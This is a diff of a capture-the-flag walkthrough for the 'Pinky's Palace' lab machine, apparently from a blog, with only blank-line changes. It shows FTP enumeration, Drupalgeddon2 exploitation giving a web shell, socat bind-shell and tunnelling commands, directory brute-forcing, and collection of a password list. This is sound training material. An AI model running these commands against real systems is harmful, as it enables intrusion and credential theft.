@@ -58,14 +58,11 @@ Nmap done: 1 IP address (1 host up) scanned in 12.68 seconds
 
 ```
 
-
 Starting from the top we can see that we have FTP open on 21 with anonymous login allowed. We also have SSH on a custom port 5555 as well as a Drupal 7 site on 8000. 
-
 
 We should know just from looking at those results that the Drupal site should be vulnerable to at least one Drupalgeddon. So to be thorough we take a look at the FTP:
 
 ```
-
 root@kali: ftp 192.168.1.148
 Connected to 192.168.1.148.
 220 Pinky's FTP
@@ -106,7 +103,6 @@ ftp>
 
 We have spoken in the past about the differences between passive and active. We notice initially that running commands in active (default) don’t work very well so we reconnect in passive mode.
 
-
 We then pull the `WELCOME` file but also notice that there is a sneaky `…` folder that is not a default thing. So we head in there to see whats going on.
 
 ```
@@ -137,9 +133,7 @@ local: firewall.sh remote: firewall.sh
 
 ```
 
-
 In the `…` folder we have another hidden folder called `.bak` and in there we find an interesting looking file we grab as well. `firewall.sh`.
-
 
 Taking a look. We see what we expected from the WELCOME file.
 
@@ -157,7 +151,6 @@ You will learn much more this way!
 
 ```
 
-
 Then in our firewall file we have:
 
 ```
@@ -170,21 +163,15 @@ ip6tables -A OUTPUT -o eth0 -p tcp --tcp-flags ALL SYN -m state --state NEW -j D
 
 ```
 
-
 Interestingly we see that it is a script to set up some firewall rules. Reading the commands, it is setting up the local firewall to block all outgoing TCP traffic on both ipv4 and ipv6.
-
 
 A quick explanation, IPTables uses the concept of a ‘chain’, which is a series of processing steps a given packet has to go through. The OUTPUT chain is for all outbound IP traffic. -A defines the chain we want to add the rule to, -o is the interface we want the rule to apply to. --tcp--flags contains two arguments. The first argument is which TCP flags will trigger this rule (All of them, rather than just SYN, ACK, RST etc…), and the second argument is which flags must be set for the rule to apply. In this case all packets will be checked (based on their flags), but only the SYN flag should be set for this rule to trigger. 
 
-
 -m state allows for using the state of a TCP connection in decision making, in our case --state is looking for new TCP sessions. -j means ‘jump’, or which chain to jump packet processing to. In this case DROP is a special chain that drops the packet.
-
 
 The above rule basically prevents any new connections from leaving the server, however inbound connections will work, as the SYN, ACK/SYN, ACK process for TCP connections will still work, as the first outbound packet from the server in that case has the ACK and SYN flags set together, which won’t trigger this rule.
 
-
 Looks like that’s it from the FTP. So time to dive into the fun stuff.
-
 
 Browsing to the site we get a standard Drupal site and the `CANGELOG.txt` file confirms that it is an older version of Drupal we know is vulnerable to Drupalgeddon.
 
@@ -215,7 +202,6 @@ root@kali: droopescan scan drupal -u 192.168.1.148:8000
     profile http://192.168.1.148:8000/modules/profile/
     php http://192.168.1.148:8000/modules/php/
 ```
-
 
 So we move on to finding an actual exploit.
 
@@ -319,7 +305,6 @@ Shellcodes: No Result
 
 ```
 
-
 However two options are appealing:
 
 ```
@@ -329,7 +314,6 @@ Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execut
 Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)          | exploits/php/webapps/44448.py
 
 ```
-
 
 These are both for the drupalgeddon2 vulnerability, which allow bash command injection from an un-authenticated context, however the Python PoC doesn’t work on our specific version of Drupal. Pulling apart the ruby version it appears there are a number of checks made to understand the specific vulnerability that will be used to gain execution. We did have plans to re-implement this, however given time (and laziness) we didn’t. This script does 3 key things though:
 
@@ -410,18 +394,13 @@ ruby: warning: shebang line ending with \r may cause problems
 [i] Fake PHP shell:   curl 'http://10.10.0.17:8000/shell.php' -d 'c=hostname'
 ```
 
-
 Running this in verbose we can actually see the URLs it generated to abuse this vulnerability.
-
 
 Great, we now have an average shell.
 
-
 The next step is figuring out how to get a less crap shell. 
 
-
 Reverse shells aren’t going to work here because they rely on being able to communicate out from the server, instead we want a bind shell. 
-
 
 A bind shell is effectively no different from SSH or Telnet. You connect to the server and then send it commands, rather than the server connecting to you and you sending it commands. A bind shell works where the reverse shell doesn’t because of the firewall rules we discovered earlier. These rules block all new outgoing connections (SYN). With a reverse shell, we as the attacker have the listener waiting for a connection, and we tell the target to connect out to us. In the case of a bind shell we set the listener up on the target, and it waits for us to connect in.
 
@@ -440,11 +419,9 @@ You will find that gets you a shell, but you need to upgrade it with `python -c 
 
 Note that on the server (using the fake shell) we have to use `nohup`. nohup is a simple utility that prevents processes from closing when a terminal ends. Our PHP reverse shell will sit there for ~30 seconds before timing out, so without nohup all your shells only last 30 seconds, however it does leave nohup.out files on the file system, where shell output is written.
 
-
 A better alternative is to use some extra arguments in socat:
 
 ```
-
 Server:
 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 
@@ -453,12 +430,9 @@ socat FILE:`tty`,raw,echo=0 TCP:<server IP>:1337
 
 ```
 
-
 This drops us straight in to a full shell without needing to upgrade. 
 
-
 Let’s break this down:
-
 
 `TCP-LISTEN:4444` - Simply telling socat to listen on port 1337 and wait for an incoming connection.
 
@@ -468,17 +442,13 @@ Let’s break this down:
 
 `EXEC:…` - Binds the binaries to the channel so that they are executed when a connection is made. This is what gives us our shell on connection. But it could just as easily run a script or perform a task without us getting a response. For example `EXEC:'echo hello /tmp/test.txt'`
 
-
 Then from the attacker side:
 
 `FILE:`tty`,raw,echo=0` - The socat way of upgrading the shell to a fully interactive one passing through our sigints etc. allowing us to up arrow through command history, and ctrl+c etc without killing the shell.
 
-
 `TCP:<server IP>:1337` - Simply the connection details it should attempt.
 
-
 We are now the www-data user on the server, yay!
-
 
 Poking around, we see that there are a few different users on the box:
 
@@ -537,7 +507,6 @@ tcp6       0      0 :::21                   :::*                    LISTEN      
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
 ```
 
-
 There are some things listening on local only ports (127.0.0.1). This means that they are only accessible on the local server and is why our remote netcat scan didn’t pick them up.
 
 
@@ -586,7 +555,6 @@ root       916  0.0  0.0      0     0 ?        S    00:13   0:00 [kworker/0:0]
 www-data   917  0.0  0.1   5988  2856 pts/0    R+   00:16   0:00 ps -auxw
 ```
 
-
 We know that www-data is the user running the nginx server on port 8000 out of the /var/www/html folder, but this command shows us that the pinksec user is running an apache2 server. Apache uses VirtualHosts to run multiple websites on the same server, let’s go and look at the apache config and figure out where this site is being hosted from.
 
 ```
@@ -634,7 +602,6 @@ www-data@pinkys-palace:/etc/apache2/sites-available$ cat 000-default.conf
 </VirtualHost>
 # vim: syntax=apache ts=4 sw=4 sts=4 sr noet
 ```
-
 
 We get a double whammy in the default apache config file. We can see from this that there is a website running on port 80 from the `/home/pinksec/html` folder. We also can see that the port 65334 is another website running out of the `/home/pinksec/database` folder. Neither of which we have access to as www-data.
 
@@ -696,7 +663,6 @@ www-data@pinkys-palace:/tmp$ cat index.html
 </html>
 ```
 
-
 But we can make this easier though the use of a tunnel. We have used SSH before to generate an SSH tunnel and lucky for us, `socat` has the ability to do the same.
 
 ```
@@ -707,22 +673,16 @@ www-data@pinkys-palace:/tmp$ socat tcp-listen:8002,reuseaddr,fork tcp:localhost:
 
 ```
 
-
 The additional `tcp:localhost:80` argument this time is what creates our tunnel through. So now when anyone connects to the bind on port 8001 and 8002 socat will pass the traffic back and forth to the localhost ports 80 and 65334.
 
 
 So now if we look at our netstat on the target:
 
 ```
-
 www-data@pinkys-palace:/tmp$ netstat -tunlp
-
 (Not all processes could be identified, non-owned process info
-
  will not be shown, you would have to be root to see it all.)
-
 Active Internet connections (only servers)
-
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
 
 tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
@@ -751,12 +711,9 @@ udp        0      0 0.0.0.0:68              0.0.0.0:*                           
 
 ```
 
-
 And we have both ports 8001 and 8002 available to us on the entire network, tunneling to ports 80 and 65334. This means that now we can use our local kali machine to access these websites:
 
-
 ![346161170.png]({{site.baseurl}}/Images/pp3/346161170.png)
-
 
 
 ![346226713.png]({{site.baseurl}}/Images/pp3/346226713.png)
@@ -769,7 +726,6 @@ Taking a quick stab at the login form we notice that default credentials don’t
 Heading over to the database website we gobuster a bunch of different lists, until eventually we look for lists of potential database backup files and come across a list found in SQLMap:
 
 ```
-
 root@kali: gobuster dir -w /usr/share/sqlmap/data/txt/common-tables.txt -u http://192.168.1.148:8002 -x sql,bak,db,zip,tar,tar.gz
 
 ===============================================================
@@ -792,7 +748,6 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 2020/02/03 18:37:56 Finished
 ===============================================================
 ```
-
 
 Browsing to /pwds/db we get a list of what looks like potential passwords:
 
@@ -817,11 +772,9 @@ pinkysconsoleadmin
 pinksec133754
 ```
 
-
 The closest thing we have to user names is the passwd file. Let’s grab those so that we have two lists. `pwds.txt` and `users.txt`
 
 ```
-
 root@kali: cat users.txt
 root
 pinky
@@ -830,7 +783,6 @@ pinksecadmin
 pinkadmin
 dpink
 ```
-
 
 Most of these come from the passwd file. But we also uncovered the `pinkadmin` username from the drupal site and `dpink` was the drupal database user.
 
